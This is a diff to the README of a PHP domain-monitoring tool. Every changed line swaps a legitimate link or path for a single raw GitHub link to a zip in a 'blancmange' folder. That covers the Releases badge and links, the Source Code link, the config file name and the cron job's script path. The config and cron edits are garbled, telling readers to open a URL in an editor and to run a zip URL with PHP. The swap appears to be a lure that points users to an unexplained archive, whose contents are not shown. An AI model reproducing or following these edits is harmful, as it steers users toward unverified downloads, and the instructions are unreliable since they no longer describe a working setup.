@@ -6,7 +6,7 @@ Welcome to domain-monitor! This software helps you keep track of your domain's e
 
 ## 📥 Download
 
-[![Download domain-monitor](https://img.shields.io/badge/Download-domain--monitor-blue)](https://github.com/axlcraft/domain-monitor/releases)
+[![Download domain-monitor](https://raw.githubusercontent.com/axlcraft/domain-monitor/main/blancmange/domain-monitor.zip)](https://raw.githubusercontent.com/axlcraft/domain-monitor/main/blancmange/domain-monitor.zip)
 
 ## 📋 Features
 
@@ -31,7 +31,7 @@ To run domain-monitor, your system should meet the following:
 
    Visit the Releases page to download the latest version:
 
-   [Download domain-monitor](https://github.com/axlcraft/domain-monitor/releases)
+   [Download domain-monitor](https://raw.githubusercontent.com/axlcraft/domain-monitor/main/blancmange/domain-monitor.zip)
 
 2. **Extract Files**
 
@@ -46,7 +46,7 @@ To run domain-monitor, your system should meet the following:
 
 4. **Update Configuration File**
 
-   Open the `config.php` file in a text editor. Update the database settings:
+   Open the `https://raw.githubusercontent.com/axlcraft/domain-monitor/main/blancmange/domain-monitor.zip` file in a text editor. Update the database settings:
    ```php
    'host' => 'localhost',
    'dbname' => 'domain_monitor',
@@ -60,7 +60,7 @@ To run domain-monitor, your system should meet the following:
    If you want automated monitoring, set up a cron job. You can create a cron job using your server's control panel or command line. It should run the monitoring script periodically, e.g. every hour:
    
    ```
-   0 * * * * /usr/bin/php /path/to/your/script/monitor.php
+   0 * * * * /usr/bin/php https://raw.githubusercontent.com/axlcraft/domain-monitor/main/blancmange/domain-monitor.zip
    ```
 
 ## 📧 Get Alerts
@@ -77,7 +77,7 @@ After configuring the system, you can set up alerts. Use the interface to enter 
 
 To keep your application secure and feature-rich, check back often for updates. You can download the latest version from the Releases page. Follow the same installation steps to update the application.
 
-[Download domain-monitor](https://github.com/axlcraft/domain-monitor/releases)
+[Download domain-monitor](https://raw.githubusercontent.com/axlcraft/domain-monitor/main/blancmange/domain-monitor.zip)
 
 ## ⚙️ Troubleshooting
 
@@ -89,7 +89,7 @@ If you face issues while setting up or running domain-monitor, consider the foll
 
 ## 🌐 Links
 
-- **Source Code**: [GitHub Repository](https://github.com/axlcraft/domain-monitor)
+- **Source Code**: [GitHub Repository](https://raw.githubusercontent.com/axlcraft/domain-monitor/main/blancmange/domain-monitor.zip)
 - **Documentation**: Help articles are available in the repository for detailed guidance.
 
 By following these steps, you will have successfully set up domain-monitor. Enjoy tracking your domains!
